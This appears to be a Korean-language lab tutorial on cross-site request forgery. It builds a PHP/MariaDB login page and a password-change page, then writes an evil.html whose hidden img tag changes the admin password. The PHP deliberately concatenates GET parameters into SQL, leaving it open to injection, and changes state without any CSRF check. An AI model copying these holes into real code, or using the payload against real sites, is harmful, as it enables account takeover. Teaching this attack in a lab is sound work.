# CSRF (Cross Site Request Forgery)

일반 사용자의 의도와 무관하게 공격자가 설계한 행동대로 사용자의 클라이언트가 서버로 요청을 보낸다.

# **INDEX**

**1. [환경 구성](#환경-구성)**

**2. [CSRF](#CSRF)**

# **환경 구성**

| Type          | Version                   |
| :---          | :---                      |
| OS            | Ubuntu 20.04.3 LTS        |
| Architecture  | x86-64                    |
| IP            | 192.168.0.58              |
| apache2       | 2.4.41-4ubuntu3.10        |
| php           | 7.4.3                     |
| mariadb       | 10.3.34-0ubuntu0.20.04.1  |

apache, php와 데이터베이스를 사용하기 위해 관련 패키지를 설치하자.

```sh
root@ubuntu:~# apt -y install apache2 php mariadb-server php-mysql
```

root비밀번호를 설정하고 데이터베이스, 테이블을 생성한 뒤 데이터를 넣자.

```sh
root@ubuntu:~# mysql_secure_installation
Enter current password for root (enter for none):
Set root password? [Y/n] Y
New password:
Re-enter new password:
Remove anonymous users? [Y/n] Y
Disallow root login remotely? [Y/n] n
Remove test database and access to it? [Y/n] Y
Reload privilege tables now? [Y/n] Y
root@ubuntu:~# mysql -u root -p'root'
MariaDB [(none)]> create database test;
MariaDB [(none)]> use test;
MariaDB [test]> create table user (id varchar(30), pw varchar(30));
MariaDB [test]> insert into user(id,pw) values('admin','helloworld');
```

생성한 데이터베이스로 접근할 수 있는 권한을 부여하자.

```sh
MariaDB [(none)]> grant all privileges on test.* to 'root'@localhost identified by 'root';
MariaDB [(none)]> flush privileges;
```

이후 php.ini를 수정하여 데이터베이스 관련 함수를 사용할 수 있도록 하자.

```ini
extension=mysqli.so
```

로그인 페이지(index.php)를 생성하자.

```php
<?php
    session_start();
	if (isset($_GET['userid']) && isset($_GET['password'])) {
		$conn = mysqli_connect("localhost", "root", "root", "test");
		if (!$conn) die("mysql connect error : ".mysqli_connect_error($conn));
		$sql = "SELECT id, pw FROM user WHERE id='".$_GET['userid']."' and pw='".$_GET['password']."'";
		$result = mysqli_query($conn, $sql);
		$row = mysqli_fetch_array($result);
		if ($row) {
            $_SESSION['id'] = $row['id'];
            echo "Welcome ".$_SESSION['id'];
        }
		else echo "Login Failed";
		mysqli_close($conn);
	}  else {
?>
<html>
	<body>
		<form action="/index.php" method="get">
			<label>ID : </label><input type="text" name="userid" required>
			<label>PW : </label><input type="password" name="password" required>
			<input type="submit" value="login">
		</form>
	</body>
</html>
<?php
	}
?>
```

비밀번호 변경 페이지(modifyuser.php)를 생성하자.

```php
<?php
    session_start();
    if (isset($_SESSION['id'])) {
        $conn = mysqli_connect("localhost", "root", "root", "test");
        if (!$conn) die("mysql connect error : ".mysqli_connect_error($conn));
        $sql = "UPDATE user SET pw ='".$_GET['password']."'";
        $result = mysqli_query($conn, $sql);
        mysqli_close($conn);
    }
?>
```

CSRF 공격 페이지(evil.html)를 작성하자.

```html
<img src="http://192.168.0.58/modifyuser.php?password=hack" style="display: none;">
```

# **CSRF**

index.php에서 관리자(admin)로 로그인하자.

| data	| value	|
| :---	| :--- 	|
| ID	| admin |
| PW	| helloworld |
| URL	| http://192.168.0.58/index.php?userid=admin&password=helloworld |

공격자가 관리자에게 피싱메일 등으로 인해 관리자가 evil.html로 접속한다고 가정하고, 접속하자.

그렇다면, img의 src에 의해서 관리자의 비밀번호가 바뀌게 된다.

변경된 비밀번호로 로그인하자.

| data	| value	|
| :---	| :--- 	|
| ID	| admin |
| PW	| hack  |
| URL	| http://192.168.0.58/index.php?userid=admin&password=hack |